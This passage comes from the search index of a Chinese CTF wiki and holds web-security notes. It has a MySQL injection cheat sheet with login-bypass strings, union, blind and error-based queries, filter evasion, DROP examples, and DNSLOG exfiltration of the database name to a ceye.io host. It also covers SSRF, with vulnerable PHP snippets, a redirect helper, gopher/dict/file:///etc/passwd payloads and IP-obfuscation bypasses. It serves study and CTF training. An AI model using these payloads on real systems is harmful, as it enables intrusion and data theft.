</ul>"},{"location":"web_bak/ctf-wiki-web/SQLI/#_2","title":"\u5e38\u7528\u5de5\u5177\u00b6","text":"<ul> <li>Burp Suite\uff1aBurp Suite \u4f7f\u7528\u4ecb\u7ecd</li> <li>Tamper Data (Firefox addon)</li> <li>HackBar (Firefox addon)</li> <li>sqlmap\uff1asqlmap \u7528\u6237\u624b\u518c</li> </ul>"},{"location":"web_bak/ctf-wiki-web/SQLI/#_3","title":"\u6ce8\u5165\u5e38\u89c1\u53c2\u6570\u00b6","text":"<ul> <li><code>user()</code>\uff1a\u5f53\u524d\u6570\u636e\u5e93\u7528\u6237</li> <li><code>database()</code>\uff1a\u5f53\u524d\u6570\u636e\u5e93\u540d</li> <li><code>version()</code>\uff1a\u5f53\u524d\u4f7f\u7528\u7684\u6570\u636e\u5e93\u7248\u672c</li> <li><code>@@datadir</code>\uff1a\u6570\u636e\u5e93\u5b58\u50a8\u6570\u636e\u8def\u5f84</li> <li><code>concat()</code>\uff1a\u8054\u5408\u6570\u636e\uff0c\u7528\u4e8e\u8054\u5408\u4e24\u6761\u6570\u636e\u7ed3\u679c\u3002\u5982<code>concat(username,0x3a,password)</code></li> <li><code>group_concat()</code>\uff1a\u548c<code>concat()</code>\u7c7b\u4f3c\uff0c\u5982<code>group_concat(DISTINCT+user,0x3a,password)</code>\uff0c\u7528\u4e8e\u628a\u591a\u6761\u6570\u636e\u4e00\u6b21\u6ce8\u5165\u51fa\u6765</li> <li><code>concat_ws()</code>\uff1a\u7528\u6cd5\u7c7b\u4f3c</li> <li><code>hex()</code>\u548c<code>unhex()</code>\uff1a\u7528\u4e8e hex \u7f16\u7801\u89e3\u7801</li> <li><code>load_file()</code>\uff1a\u4ee5\u6587\u672c\u65b9\u5f0f\u8bfb\u53d6\u6587\u4ef6\uff0c\u5728 Windows \u4e2d\uff0c\u8def\u5f84\u8bbe\u7f6e\u4e3a<code>\\\\</code></li> <li><code>select xxoo into outfile '\u8def\u5f84'</code>\uff1a\u6743\u9650\u8f83\u9ad8\u65f6\u53ef\u76f4\u63a5\u5199\u6587\u4ef6</li> </ul>"},{"location":"web_bak/ctf-wiki-web/SQLI/#_4","title":"\u8bed\u6cd5\u53c2\u8003\u4e0e\u5c0f\u6280\u5de7\u00b6","text":""},{"location":"web_bak/ctf-wiki-web/SQLI/#_5","title":"\u884c\u95f4\u6ce8\u91ca\u00b6","text":"<p><code>--</code></p> <p><pre><code>DROP sampletable;--\n</code></pre> <code>#</code> <pre><code>DROP sampletable;#\n</code></pre></p>"},{"location":"web_bak/ctf-wiki-web/SQLI/#_6","title":"\u884c\u5185\u6ce8\u91ca\u00b6","text":"<p><code>/*\u6ce8\u91ca\u5185\u5bb9*/</code></p> <p><pre><code>DROP/*comment*/sampletable`   DR/**/OP/*\u7ed5\u8fc7\u8fc7\u6ee4*/sampletable`   SELECT/*\u66ff\u6362\u7a7a\u683c*/password/**/FROM/**/Members\n</code></pre> <code>/*! MYSQL\u4e13\u5c5e */</code> <pre><code>SELECT /*!32302 1/0, */ 1 FROM tablename\n</code></pre></p>"},{"location":"web_bak/ctf-wiki-web/SQLI/#_7","title":"\u5b57\u7b26\u4e32\u7f16\u7801\u00b6","text":"<ul> <li><code>ASCII()</code>\uff1a\u8fd4\u56de\u5b57\u7b26\u7684 ASCII \u7801\u503c</li> <li><code>CHAR()</code>\uff1a\u628a\u6574\u6570\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u5b57\u7b26</li> </ul>"},{"location":"web_bak/ctf-wiki-web/SQLI/#_8","title":"\u540e\u53f0\u4e07\u80fd\u5bc6\u7801\u00b6","text":"<ul> <li><code>admin' --</code></li> <li><code>admin' #</code></li> <li><code>admin'/*</code></li> <li><code>' or 1=1--</code></li> <li><code>' or 1=1#</code></li> <li><code>' or 1=1/*</code></li> <li><code>') or '1'='1--</code></li> <li><code>') or ('1'='1--</code></li> <li>\u4ee5\u4e0d\u540c\u7684\u7528\u6237\u767b\u9646<code>' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--</code></li> </ul>"},{"location":"web_bak/ctf-wiki-web/SQLI/#_9","title":"\u6ce8\u5165\u8bed\u53e5\u5907\u5fd8\u00b6","text":""},{"location":"web_bak/ctf-wiki-web/SQLI/#_10","title":"\u6570\u636e\u5e93\u540d\u00b6","text":"<pre><code>SELECT database();\nSELECT schema_name FROM information_schema.schemata;\n</code></pre>"},{"location":"web_bak/ctf-wiki-web/SQLI/#_11","title":"\u8868\u540d\u00b6","text":"<p>union \u67e5\u8be2</p> <p><pre><code>--MySQL 4\u7248\u672c\u65f6\u7528version=9\uff0cMySQL 5\u7248\u672c\u65f6\u7528version=10\nUNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;   /* \u5217\u51fa\u5f53\u524d\u6570\u636e\u5e93\u4e2d\u7684\u8868 */\nUNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database();   /* \u5217\u51fa\u6240\u6709\u7528\u6237\u81ea\u5b9a\u4e49\u6570\u636e\u5e93\u4e2d\u7684\u8868 */\nSELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='mysql';\n</code></pre> \u76f2\u6ce8 <pre><code>AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; 'A'\n</code></pre> \u62a5\u9519 <pre><code>AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));\n-- \u57285.1.5\u7248\u672c\u4e2d\u6210\u529f\u3002\n</code></pre></p>"},{"location":"web_bak/ctf-wiki-web/SQLI/#_12","title":"\u5217\u540d\u00b6","text":"<p>union \u67e5\u8be2</p> <p><pre><code>UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'\n</code></pre> \u76f2\u6ce8 <pre><code>AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; 'A'\n</code></pre> \u62a5\u9519 <pre><code>-- \u57285.1.5\u7248\u672c\u4e2d\u6210\u529f\nAND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)\n-- MySQL 5.1\u7248\u672c\u4fee\u590d\u4e86\nAND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));\n</code></pre> \u5229\u7528<code>PROCEDURE ANALYSE()</code> <pre><code>-- \u8fd9\u4e2a\u9700\u8981 web \u5c55\u793a\u9875\u9762\u6709\u4f60\u6240\u6ce8\u5165\u67e5\u8be2\u7684\u4e00\u4e2a\u5b57\u6bb5\n-- \u83b7\u5f97\u7b2c\u4e00\u4e2a\u6bb5\u540d\nSELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE()\n-- \u83b7\u5f97\u7b2c\u4e8c\u4e2a\u6bb5\u540d\n1 LIMIT 1,1 PROCEDURE ANALYSE()\n-- \u83b7\u5f97\u7b2c\u4e09\u4e2a\u6bb5\u540d\n1 LIMIT 2,1 PROCEDURE ANALYSE()\n</code></pre></p>"},{"location":"web_bak/ctf-wiki-web/SQLI/#_13","title":"\u6839\u636e\u5217\u540d\u67e5\u8be2\u6240\u5728\u7684\u8868\u00b6","text":"<pre><code>-- \u67e5\u8be2\u5b57\u6bb5\u540d\u4e3a username \u7684\u8868\nSELECT table_name FROM information_schema.columns WHERE column_name = 'username';\n-- \u67e5\u8be2\u5b57\u6bb5\u540d\u4e2d\u5305\u542b username \u7684\u8868\nSELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';\n</code></pre>"},{"location":"web_bak/ctf-wiki-web/SQLI/#_14","title":"\u7ed5\u8fc7\u5f15\u53f7\u9650\u5236\u00b6","text":"<pre><code>-- hex \u7f16\u7801\nSELECT * FROM Users WHERE username = 0x61646D696E\n-- char() \u51fd\u6570\nSELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)\n</code></pre>"},{"location":"web_bak/ctf-wiki-web/SQLI/#_15","title":"\u7ed5\u8fc7\u5b57\u7b26\u4e32\u9ed1\u540d\u5355\u00b6","text":"<p><pre><code>SELECT 'a' 'd' 'mi' 'n';\nSELECT CONCAT('a', 'd', 'm', 'i', 'n');\nSELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');\nSELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');\n</code></pre> \u4f7f\u7528<code>CONCAT()</code>\u65f6\uff0c\u4efb\u4f55\u4e2a\u53c2\u6570\u4e3a null\uff0c\u5c06\u8fd4\u56de null\uff0c\u63a8\u8350\u4f7f\u7528<code>CONCAT_WS()</code>\u3002<code>CONCAT_WS()</code>\u51fd\u6570\u7b2c\u4e00\u4e2a\u53c2\u6570\u8868\u793a\u7528\u54ea\u4e2a\u5b57\u7b26\u95f4\u9694\u6240\u67e5\u8be2\u7684\u7ed3\u679c\u3002</p>"},{"location":"web_bak/ctf-wiki-web/SQLI/#_16","title":"\u6761\u4ef6\u8bed\u53e5\u00b6","text":"<p><code>CASE</code>,<code>IF()</code>,<code>IFNULL()</code>,<code>NULLIF()</code>.</p> <pre><code>SELECT IF(1=1, true, false);\nSELECT CASE WHEN 1=1 THEN true ELSE false END;\n</code></pre>"},{"location":"web_bak/ctf-wiki-web/SQLI/#_17","title":"\u5ef6\u65f6\u51fd\u6570\u00b6","text":"<p><code>SLEEP()</code>,<code>BENCHMARK()</code>.</p> <pre><code>' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '\n</code></pre>"},{"location":"web_bak/ctf-wiki-web/SQLI/#order-by","title":"order by \u540e\u7684\u6ce8\u5165\u00b6","text":"<p><code>order by</code>\u7531\u4e8e\u662f\u6392\u5e8f\u8bed\u53e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u5229\u7528\u6761\u4ef6\u8bed\u53e5\u505a\u5224\u65ad\uff0c\u6839\u636e\u8fd4\u56de\u7684\u6392\u5e8f\u7ed3\u679c\u4e0d\u540c\u5224\u65ad\u6761\u4ef6\u7684\u771f\u5047\u3002\u4e00\u822c\u5e26\u6709<code>order</code>\u6216\u8005<code>order by</code>\u7684\u53d8\u91cf\u5f88\u53ef\u80fd\u662f\u8fd9\u79cd\u6ce8\u5165\uff0c\u5728\u77e5\u9053\u4e00\u4e2a\u5b57\u6bb5\u7684\u65f6\u5019\u53ef\u4ee5\u91c7\u7528\u5982\u4e0b\u65b9\u5f0f\u6ce8\u5165\uff1a</p> <p>\u539f\u59cb\u94fe\u63a5\uff1a<code>http://www.test.com/list.php?order=vote</code></p> <p>\u6839\u636e<code>vote</code>\u5b57\u6bb5\u6392\u5e8f\u3002\u627e\u5230\u6295\u7968\u6570\u6700\u5927\u7684\u7968\u6570<code>num</code>\u7136\u540e\u6784\u9020\u4ee5\u4e0b\u94fe\u63a5\uff1a</p> <p><pre><code>http://www.test.com/list.php?order=abs(vote-(length(user())&gt;0)*num)+asc\n</code></pre> \u770b\u6392\u5e8f\u662f\u5426\u53d8\u5316\u3002\u8fd8\u6709\u4e00\u79cd\u65b9\u6cd5\u4e0d\u9700\u8981\u77e5\u9053\u4efb\u4f55\u5b57\u6bb5\u4fe1\u606f\uff0c\u4f7f\u7528<code>rand</code>\u51fd\u6570\uff1a <pre><code>http://www.test.com/list.php?order=rand(true)\nhttp://www.test.com/list.php?order=rand(false)\n</code></pre> \u4ee5\u4e0a\u4e24\u4e2a\u4f1a\u8fd4\u56de\u4e0d\u540c\u7684\u6392\u5e8f\uff0c\u5224\u65ad\u8868\u540d\u4e2d\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u5426\u5c0f\u4e8e 128 \u7684\u8bed\u53e5\u5982\u4e0b\uff1a <pre><code>http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)&lt;=128))\n</code></pre></p>"},{"location":"web_bak/ctf-wiki-web/SQLI/#_18","title":"\u5bbd\u5b57\u8282\u6ce8\u5165\u00b6","text":"<p>\u56fd\u5185\u6700\u5e38\u4f7f\u7528\u7684 GBK \u7f16\u7801\uff0c\u8fd9\u79cd\u65b9\u5f0f\u4e3b\u8981\u662f\u7ed5\u8fc7<code>addslashes</code>\u7b49\u5bf9\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u8f6c\u79fb\u7684\u7ed5\u8fc7\u3002\u53cd\u659c\u6760<code>\\</code>\u7684\u5341\u516d\u8fdb\u5236\u4e3a<code>%5c</code>\uff0c\u5728\u4f60\u8f93\u5165<code>%bf%27</code>\u65f6\uff0c\u51fd\u6570\u9047\u5230\u5355\u5f15\u53f7\u81ea\u52a8\u8f6c\u79fb\u52a0\u5165<code>\\</code>\uff0c\u6b64\u65f6\u53d8\u4e3a<code>%bf%5c%27</code>\uff0c<code>%bf%5c</code>\u5728 GBK \u4e2d\u53d8\u4e3a\u4e00\u4e2a\u5bbd\u5b57\u7b26\u300c\u7e17\u300d\u3002<code>%bf</code>\u90a3\u4e2a\u4f4d\u7f6e\u53ef\u4ee5\u662f<code>%81-%fe</code>\u4e2d\u95f4\u7684\u4efb\u4f55\u5b57\u7b26\u3002\u4e0d\u6b62\u5728 SQL \u6ce8\u5165\u4e2d\uff0c\u5bbd\u5b57\u7b26\u6ce8\u5165\u5728\u5f88\u591a\u5730\u65b9\u90fd\u53ef\u4ee5\u5e94\u7528\u3002</p>"},{"location":"web_bak/ctf-wiki-web/SQLI/#dnslog","title":"DNSLOG \u6ce8\u5165\u00b6","text":"<p>DNS \u5728\u89e3\u6790\u7684\u65f6\u5019\u4f1a\u7559\u4e0b\u65e5\u5fd7\uff0c\u901a\u8fc7\u8bfb\u53d6\u591a\u7ea7\u57df\u540d\u7684\u89e3\u6790\u65e5\u5fd7\uff0c\u6765\u83b7\u53d6\u4fe1\u606f\u3002\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u628a\u4fe1\u606f\u653e\u5728\u9ad8\u7ea7\u57df\u540d\u4e2d\uff0c\u4f20\u9012\u5230\u81ea\u5df1\u8fd9\uff0c\u7136\u540e\u8bfb\u53d6\u65e5\u5fd7\uff0c\u83b7\u53d6\u4fe1\u606f\u3002</p> <p>dnslog \u5e73\u53f0\uff1ahttp://ceye.io/</p> <p><pre><code>mysql&gt; use security;\nDatabase changed\nmysql&gt; select load_file('\\\\\\\\test.xxx.ceye.io\\\\abc');\n+-------------------------------------------+\n| load_file('\\\\\\\\test.xxx.ceye.io\\\\abc') |\n+-------------------------------------------+\n| NULL                                      |\n+-------------------------------------------+\n1 row in set (22.05 sec)\nmysql&gt; select load_file(concat('\\\\\\\\',(select database()),'.xxx.ceye.io\\\\abc'));\n+----------------------------------------------------------------------+\n| load_file(concat('\\\\\\\\',(select database()),'.xxx.ceye.io\\\\abc')) |\n+----------------------------------------------------------------------+\n| NULL                                                                 |\n+----------------------------------------------------------------------+\n1 row in set (0.00 sec)\n</code></pre> </p>"},{"location":"web_bak/ctf-wiki-web/SQLI/#_19","title":"\u53c2\u8003\u8d44\u6599\u00b6","text":"<ul> <li>SQL \u6ce8\u5165\u901f\u67e5\u8868</li> <li>MySQL \u6ce8\u5165\u6280\u5de7</li> <li>MySQL \u6ce8\u5165\u79d1\u666e</li> <li>MySQL \u6ce8\u5165\u603b\u7ed3</li> <li>\u300aSQL \u6ce8\u5165\u653b\u51fb\u4e0e\u9632\u5fa1\u300b</li> </ul>"},{"location":"web_bak/ctf-wiki-web/SSRF/","title":"SSRF","text":""},{"location":"web_bak/ctf-wiki-web/SSRF/#ssrf","title":"SSRF \u7b80\u4ecb\u00b6","text":"<p>SSRF\uff0cServer-Side Request Forgery\uff0c\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0c\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u5668\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF \u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002</p> <p>\u6f0f\u6d1e\u5f62\u6210\u7684\u539f\u56e0\u5927\u591a\u662f\u56e0\u4e3a\u670d\u52a1\u7aef\u63d0\u4f9b\u4e86\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u5e94\u7528\u83b7\u53d6\u6570\u636e\u7684\u529f\u80fd\u4e14\u6ca1\u6709\u5bf9\u76ee\u6807\u5730\u5740\u4f5c\u8fc7\u6ee4\u548c\u9650\u5236\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528 SSRF \u5b9e\u73b0\u7684\u653b\u51fb\u4e3b\u8981\u6709 5 \u79cd\uff1a</p> <ol> <li>\u53ef\u4ee5\u5bf9\u5916\u7f51\u3001\u670d\u52a1\u5668\u6240\u5728\u5185\u7f51\u3001\u672c\u5730\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u83b7\u53d6\u4e00\u4e9b\u670d\u52a1\u7684 banner \u4fe1\u606f</li> <li>\u653b\u51fb\u8fd0\u884c\u5728\u5185\u7f51\u6216\u672c\u5730\u7684\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6ea2\u51fa\uff09</li> <li>\u5bf9\u5185\u7f51 WEB \u5e94\u7528\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u901a\u8fc7\u8bbf\u95ee\u9ed8\u8ba4\u6587\u4ef6\u5b9e\u73b0</li> <li>\u653b\u51fb\u5185\u5916\u7f51\u7684 web \u5e94\u7528\uff0c\u4e3b\u8981\u662f\u4f7f\u7528 GET \u53c2\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7684\u653b\u51fb\uff08\u6bd4\u5982 Struts2\uff0csqli \u7b49\uff09</li> <li>\u5229\u7528<code>file</code>\u534f\u8bae\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7b49</li> </ol>"},{"location":"web_bak/ctf-wiki-web/SSRF/#ssrf_1","title":"SSRF \u6f0f\u6d1e\u51fa\u73b0\u7684\u573a\u666f\u00b6","text":"<ul> <li>\u80fd\u591f\u5bf9\u5916\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\u7684\u5730\u65b9\uff0c\u5c31\u53ef\u80fd\u5b58\u5728 SSRF \u6f0f\u6d1e</li> <li>\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u8bf7\u6c42\u8d44\u6e90\uff08Upload from URL\uff0cImport &amp; Export RSS Feed\uff09</li> <li>\u6570\u636e\u5e93\u5185\u7f6e\u529f\u80fd\uff08Oracle\u3001MongoDB\u3001MSSQL\u3001Postgres\u3001CouchDB\uff09</li> <li>Webmail \u6536\u53d6\u5176\u4ed6\u90ae\u7bb1\u90ae\u4ef6\uff08POP3\u3001IMAP\u3001SMTP\uff09</li> <li>\u6587\u4ef6\u5904\u7406\u3001\u7f16\u7801\u5904\u7406\u3001\u5c5e\u6027\u4fe1\u606f\u5904\u7406\uff08ffmpeg\u3001ImageMagic\u3001DOCX\u3001PDF\u3001XML\uff09</li> </ul>"},{"location":"web_bak/ctf-wiki-web/SSRF/#_1","title":"\u5e38\u7528\u7684\u540e\u7aef\u5b9e\u73b0\u00b6","text":"<p><code>file_get_contents</code></p> <p><pre><code>&lt;?php\nif (isset($_POST['url'])) { \n    $content = file_get_contents($_POST['url']); \n    $filename ='./images/'.rand().';img1.jpg'; \n    file_put_contents($filename, $content); \n    echo $_POST['url']; \n    $img = \"&lt;img src=\\\"\".$filename.\"\\\"/&gt;\"; \n}\necho $img;\n?&gt;\n</code></pre> 1. \u8fd9\u6bb5\u4ee3\u7801\u4f7f\u7528<code>file_get_contents</code>\u51fd\u6570\u4ece\u7528\u6237\u6307\u5b9a\u7684 URL \u83b7\u53d6\u56fe\u7247\u3002\u7136\u540e\u628a\u5b83\u7528\u4e00\u4e2a\u968f\u673a\u6587\u4ef6\u540d\u4fdd\u5b58\u5728\u786c\u76d8\u4e0a\uff0c\u5e76\u5c55\u793a\u7ed9\u7528\u6237\u3002</p> <p><code>fsockopen()</code></p> <p><pre><code>&lt;?php \nfunction GetFile($host,$port,$link) { \n    $fp = fsockopen($host, intval($port), $errno, $errstr, 30); \n    if (!$fp) { \n        echo \"$errstr (error number $errno) \\n\"; \n    } else { \n        $out = \"GET $link HTTP/1.1\\r\\n\"; \n        $out .= \"Host: $host\\r\\n\"; \n        $out .= \"Connection: Close\\r\\n\\r\\n\"; \n        $out .= \"\\r\\n\"; \n        fwrite($fp, $out); \n        $contents=''; \n        while (!feof($fp)) { \n            $contents.= fgets($fp, 1024); \n        } \n        fclose($fp); \n        return $contents; \n    } \n}\n?&gt;\n</code></pre> 1. \u8fd9\u6bb5\u4ee3\u7801\u4f7f\u7528<code>fsockopen</code>\u51fd\u6570\u5b9e\u73b0\u83b7\u53d6\u7528\u6237\u5236\u5b9a URL \u7684\u6570\u636e\uff08\u6587\u4ef6\u6216\u8005 HTML\uff09\u3002\u8fd9\u4e2a\u51fd\u6570\u4f1a\u4f7f\u7528 socket \u8ddf\u670d\u52a1\u5668\u5efa\u7acb TCP \u8fde\u63a5\uff0c\u4f20\u8f93\u539f\u59cb\u6570\u636e\u3002</p> <p><code>curl_exec()</code></p> <p><pre><code>&lt;?php \nif (isset($_POST['url'])) {\n    $link = $_POST['url'];\n    $curlobj = curl_init();\n    curl_setopt($curlobj, CURLOPT_POST, 0);\n    curl_setopt($curlobj,CURLOPT_URL,$link);\n    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);\n    $result=curl_exec($curlobj);\n    curl_close($curlobj);\n    $filename = './curled/'.rand().'.txt';\n    file_put_contents($filename, $result); \n    echo $result;\n}\n?&gt;\n</code></pre> 1. \u4f7f\u7528<code>curl</code>\u83b7\u53d6\u6570\u636e\u3002</p>"},{"location":"web_bak/ctf-wiki-web/SSRF/#ssrf_2","title":"\u963b\u788d SSRF \u6f0f\u6d1e\u5229\u7528\u7684\u573a\u666f\u00b6","text":"<ul> <li>\u670d\u52a1\u5668\u5f00\u542f OpenSSL \u65e0\u6cd5\u8fdb\u884c\u4ea4\u4e92\u5229\u7528</li> <li>\u670d\u52a1\u7aef\u9700\u8981\u9274\u6743\uff08Cookies &amp; User\uff1aPass\uff09\u4e0d\u80fd\u5b8c\u7f8e\u5229\u7528</li> <li>\u9650\u5236\u8bf7\u6c42\u7684\u7aef\u53e3\u4e3a http \u5e38\u7528\u7684\u7aef\u53e3\uff0c\u6bd4\u5982\uff0c80,443,8080,8090\u3002</li> <li>\u7981\u7528\u4e0d\u9700\u8981\u7684\u534f\u8bae\u3002\u4ec5\u4ec5\u5141\u8bb8 http \u548c https \u8bf7\u6c42\u3002\u53ef\u4ee5\u9632\u6b62\u7c7b\u4f3c\u4e8efile:///,gopher://,ftp://\u7b49\u5f15\u8d77\u7684\u95ee\u9898\u3002</li> <li>\u7edf\u4e00\u9519\u8bef\u4fe1\u606f\uff0c\u907f\u514d\u7528\u6237\u53ef\u4ee5\u6839\u636e\u9519\u8bef\u4fe1\u606f\u6765\u5224\u65ad\u8fdc\u7aef\u670d\u52a1\u5668\u7684\u7aef\u53e3\u72b6\u6001\u3002</li> </ul>"},{"location":"web_bak/ctf-wiki-web/SSRF/#ssrf_3","title":"\u5229\u7528 SSRF \u8fdb\u884c\u7aef\u53e3\u626b\u63cf\u00b6","text":"<p>\u6839\u636e\u670d\u52a1\u5668\u7684\u8fd4\u56de\u4fe1\u606f\u8fdb\u884c\u5224\u65ad\uff0c\u5927\u90e8\u5206\u5e94\u7528\u4e0d\u4f1a\u5224\u522b\u7aef\u53e3\uff0c\u53ef\u901a\u8fc7\u8fd4\u56de\u7684 banner \u4fe1\u606f\u5224\u65ad\u7aef\u53e3\u72b6\u6001\u3002</p> <p>\u540e\u7aef\u5b9e\u73b0</p> <p><pre><code>&lt;?php \nif (isset($_POST['url'])) {\n    $link = $_POST['url'];\n    $filename = './curled/'.rand().'txt';\n    $curlobj = curl_init($link);\n    $fp = fopen($filename,\"w\");\n    curl_setopt($curlobj, CURLOPT_FILE, $fp);\n    curl_setopt($curlobj, CURLOPT_HEADER, 0);\n    curl_exec($curlobj);\n    curl_close($curlobj);\n    fclose($fp);\n    $fp = fopen($filename,\"r\");\n    $result = fread($fp, filesize($filename)); \n    fclose($fp);\n    echo $result;\n}\n?&gt;\n</code></pre> \u6784\u9020\u4e00\u4e2a\u524d\u7aef\u9875\u9762 <pre><code>&lt;html&gt;\n&lt;body&gt;\n  &lt;form name=\"px\" method=\"post\" action=\"http://127.0.0.1/ss.php\"&gt;\n    &lt;input type=\"text\" name=\"url\" value=\"\"&gt;\n    &lt;input type=\"submit\" name=\"commit\" value=\"submit\"&gt;\n  &lt;/form&gt;\n  &lt;script&gt;&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> \u8bf7\u6c42\u975e HTTP \u7684\u7aef\u53e3\u53ef\u4ee5\u8fd4\u56de banner \u4fe1\u606f\u3002 \u6216\u53ef\u5229\u7528 302 \u8df3\u8f6c\u7ed5\u8fc7 HTTP \u534f\u8bae\u7684\u9650\u5236\u3002</p> <p>\u8f85\u52a9\u811a\u672c</p> <p><pre><code>&lt;?php\n$ip = $_GET['ip'];\n$port = $_GET['port'];\n$scheme = $_GET['s'];\n$data = $_GET['data'];\nheader(\"Location: $scheme://$ip:$port/$data\");\n?&gt;\n</code></pre> \u817e\u8baf\u67d0\u5904 SSRF \u6f0f\u6d1e\uff08\u975e\u5e38\u597d\u7684\u5229\u7528\u70b9\uff09\u9644\u5229\u7528\u811a\u672c</p>"},{"location":"web_bak/ctf-wiki-web/SSRF/#_2","title":"\u534f\u8bae\u5229\u7528\u00b6","text":"<p>Dict \u534f\u8bae</p> <p><pre><code>dict://fuzz.wuyun.org:8080/helo:dict\n</code></pre> Gopher \u534f\u8bae <pre><code>gopher://fuzz.wuyun.org:8080/gopher\n</code></pre> File \u534f\u8bae <pre><code>file:///etc/passwd\n</code></pre></p>"},{"location":"web_bak/ctf-wiki-web/SSRF/#_3","title":"\u7ed5\u8fc7\u59ff\u52bf\u00b6","text":"<ol> <li>\u66f4\u6539 IP \u5730\u5740\u5199\u6cd5 \u4f8b\u5982<code>192.168.0.1</code><ol> <li>8 \u8fdb\u5236\u683c\u5f0f\uff1a<code>0300.0250.0.1</code></li> <li>16 \u8fdb\u5236\u683c\u5f0f\uff1a<code>0xC0.0xA8.0.1</code></li> <li>10 \u8fdb\u5236\u6574\u6570\u683c\u5f0f\uff1a<code>3232235521</code></li> <li>16 \u8fdb\u5236\u6574\u6570\u683c\u5f0f\uff1a<code>0xC0A80001</code></li> <li>\u8fd8\u6709\u4e00\u79cd\u7279\u6b8a\u7684\u7701\u7565\u6a21\u5f0f\uff0c\u4f8b\u5982<code>10.0.0.1</code>\u8fd9\u4e2a IP \u53ef\u4ee5\u5199\u6210<code>10.1</code></li> </ol> </li> <li>\u5229\u7528 URL \u89e3\u6790\u95ee\u9898 \u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u540e\u7aef\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u5bf9\u8bbf\u95ee\u7684 URL \u8fdb\u884c\u89e3\u6790\uff0c\u5bf9\u89e3\u6790\u51fa\u6765\u7684 host \u5730\u5740\u8fdb\u884c\u8fc7\u6ee4\u3002\u8fd9\u65f6\u5019\u53ef\u80fd\u4f1a\u51fa\u73b0\u5bf9 URL \u53c2\u6570\u89e3\u6790\u4e0d\u5f53\uff0c\u5bfc\u81f4\u53ef\u4ee5\u7ed5\u8fc7\u8fc7\u6ee4\u3002 \u4f8b\u5982\uff1a<ol> <li><code>http://www.baidu.com@192.168.0.1/</code>\u4e0e<code>http://192.168.0.1</code>\u8bf7\u6c42\u7684\u90fd\u662f<code>192.168.0.1</code>\u7684\u5185\u5bb9</li> <li>\u53ef\u4ee5\u6307\u5411\u4efb\u610f ip \u7684\u57df\u540d<code>xip.io</code>\uff1a<code>http://127.0.0.1.xip.io/</code>==&gt;<code>http://127.0.0.1/</code></li> <li>\u77ed\u5730\u5740<code>http://dwz.cn/11SMa</code>==&gt;<code>http://127.0.0.1</code></li> <li>\u5229\u7528\u53e5\u53f7<code>\u3002</code>\uff1a<code>127\u30020\u30020\u30021</code>==&gt;<code>127.0.0.1</code></li> </ol> </li> </ol> <p>\u5229\u7528 Enclosed alphanumerics</p> <pre><code>\u24d4\u24e7\u24d0\u24dc\u24df\u24db\u24d4.\u24d2\u24de\u24dc  &gt;&gt;&gt;  example.com\nList:\n\u2460 \u2461 \u2462 \u2463 \u2464 \u2465 \u2466 \u2467 \u2468 \u2469 \u246a \u246b \u246c \u246d \u246e \u246f \u2470 \u2471 \u2472 \u2473 \n\u2474 \u2475 \u2476 \u2477 \u2478 \u2479 \u247a \u247b \u247c \u247d \u247e \u247f \u2480 \u2481 \u2482 \u2483 \u2484 \u2485 \u2486 \u2487 \n\u2488 